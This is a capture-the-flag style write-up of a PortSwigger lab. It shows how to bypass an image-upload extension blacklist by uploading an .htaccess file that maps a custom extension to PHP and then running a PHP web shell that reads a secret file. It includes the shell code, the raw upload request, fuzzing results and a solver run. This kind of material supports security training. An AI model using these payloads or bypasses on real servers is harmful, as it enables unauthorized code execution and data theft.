# Lab: Web shell upload via extension blacklist bypass

### Instructions

This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter` 

### Solution

We can begin this lab creating a PHP file to read the flag:

```php
<?php system('cat /home/carlos/secret'); ?>
```

We can login to the app with the provided credentials and attempt to upload our PHP script as an avatar image:

```
POST /my-account/avatar HTTP/1.1
Host: 0a95006d04b942048027628c003400ea.web-security-academy.net
Cookie: session=MMANnUFEcoTCCVYItQVe0ftGoeNq9a7z
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------276584852230757769703878946284
Content-Length: 531
Origin: https://0a95006d04b942048027628c003400ea.web-security-academy.net
Referer: https://0a95006d04b942048027628c003400ea.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

-----------------------------276584852230757769703878946284
Content-Disposition: form-data; name="avatar"; filename="flag.php"
Content-Type: application/x-php

<?php system('cat /home/carlos/secret'); ?>

-----------------------------276584852230757769703878946284
Content-Disposition: form-data; name="user"

wiener
-----------------------------276584852230757769703878946284
Content-Disposition: form-data; name="csrf"

ABeCpkfFcRx76ii9aD2hNp7A18S2rNDd
-----------------------------276584852230757769703878946284--
```

This gives us an error:

```
Sorry, php files are not allowed
Sorry, there was an error uploading your file
```

Let's send this to Intruder and use a PHP extensions list to fuzz if the app may let other PHP extensions through. A good list can be found at: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst

We can add this to Intruder, and un-tick the URL Encoding option in the Payloads page to avoid encoding the `(.)` before the file extension and kick off the scan.

```
1	.jpeg.php	403	282	false	false	347	
2	.jpg.php	403	325	false	false	347	
3	.png.php	403	330	false	false	347	
4	.php	403	325	false	false	347	
5	.php3	200	323	false	false	330	
6	.php4	200	325	false	false	330	
7	.php5	200	332	false	false	330	
```

Here we see `.php` is blocked, but extensions like `.php3` and `.php4` make it through the blacklisting.

This file seems to load, but does not actually execute the PHP:

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/File_Upload_Vulnerabilities/File_Upload_04_web_shell_upload_via_extension_blacklist_bypass]
└─$ curl https://0a95006d04b942048027628c003400ea.web-security-academy.net/files/avatars/flag.php3
<?php system('cat /home/carlos/secret'); ?>
```

Back to the drawing board we can attempt to load our own `.htaccess` file, allowing whatever file type we'd like to be loaded.

First we load a config file:

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/File_Upload_Vulnerabilities/File_Upload_04_web_shell_upload_via_extension_blacklist_bypass]
└─$ echo "AddType application/x-httpd-php .123" > .htaccess
```

Next we create a `flag.123` file:

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/File_Upload_Vulnerabilities/File_Upload_04_web_shell_upload_via_extension_blacklist_bypass]
└─$ cat flag.123 
<?php system('cat /home/carlos/secret'); ?>
```

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/File_Upload_Vulnerabilities/File_Upload_04_web_shell_upload_via_extension_blacklist_bypass]
└─$ ls -la        
total 24
drwxrwxr-x 2 ryan ryan 4096 Nov  9 10:40 .
drwxrwxr-x 6 ryan ryan 4096 Nov  9 10:08 ..
-rw-rw-r-- 1 ryan ryan 4260 Nov  9 10:40 file_upload_04_notes.md
-rw-rw-r-- 1 ryan ryan    0 Nov  9 10:08 file_upload_04.py
-rw-rw-r-- 1 ryan ryan   44 Nov  9 10:34 flag.123
-rw-rw-r-- 1 ryan ryan   37 Nov  9 10:37 .htaccess
```

We can load both of these files, and verify our code execution is working at:

```
https://0a95006d04b942048027628c003400ea.web-security-academy.net/files/avatars/flag.123
```

`EfoXfjM5KQ2lsOlM6NPWvYeJyK07rFmS`

This can be submitted to solve the lab.

### Python Solution

See `file_upload_04.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/File_Upload_Vulnerabilities/File_Upload_04_web_shell_upload_via_extension_blacklist_bypass]
└─$ python file_upload_04.py https://0ad900f30329b4f184ae6a8100330041.web-security-academy.net/
[+] Logged in as wiener
[+] Config file uploaded
[+] PHP file uploaded
[+] The lab's flag is: 40DbGaMSkD6xvxR252KAhXEp3hwsxgCJ
[*] Submitting flag to solve lab...
[+] Successfully submitted the flag
```